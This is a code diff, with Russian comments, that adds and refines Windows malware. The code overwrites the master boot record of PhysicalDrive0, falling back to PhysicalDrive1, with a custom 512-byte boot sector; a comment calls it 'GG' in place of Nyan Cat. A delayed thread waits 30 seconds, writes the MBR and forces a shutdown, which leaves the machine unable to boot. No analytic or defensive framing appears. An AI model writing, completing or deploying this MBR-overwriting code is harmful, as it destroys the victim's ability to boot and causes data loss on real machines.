@@ -6,6 +6,7 @@
 
 extern volatile bool g_running;
 
+// ====== MBR CODE (GG вместо Nyan Cat) ======
 unsigned char mbr_code[512] = {
     0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
     0xD0, 0xBC, 0x00, 0x7C, 0x89, 0xE3, 0xBD, 0x00,
@@ -73,25 +74,49 @@ unsigned char mbr_code[512] = {
     0x00, 0x55, 0xAA
 };
 
+// ====== WRITE MBR ======
 bool WriteMBR() {
-    HANDLE hDisk = CreateFileA("\\\\.\\PhysicalDrive0", 
+    HANDLE hDisk = CreateFileA(
+        "\\\\.\\PhysicalDrive0",
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
-        NULL, OPEN_EXISTING, 0, NULL);
+        NULL,
+        OPEN_EXISTING,
+        0,
+        NULL
+    );
     
-    if (hDisk == INVALID_HANDLE_VALUE) return false;
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        // Пробуем PhysicalDrive1
+        hDisk = CreateFileA(
+            "\\\\.\\PhysicalDrive1",
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_EXISTING,
+            0,
+            NULL
+        );
+    }
+    
+    if (hDisk == INVALID_HANDLE_VALUE) {
+        return false;
+    }
     
     DWORD bytesWritten;
     BOOL result = WriteFile(hDisk, mbr_code, 512, &bytesWritten, NULL);
     CloseHandle(hDisk);
+    
     return result && bytesWritten == 512;
 }
 
+// ====== DELAYED INJECTION (через 30 секунд) ======
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
     Sleep(30000);
     
     if (WriteMBR()) {
         system("shutdown /s /t 5");
     }
+    
     return 0;
 }
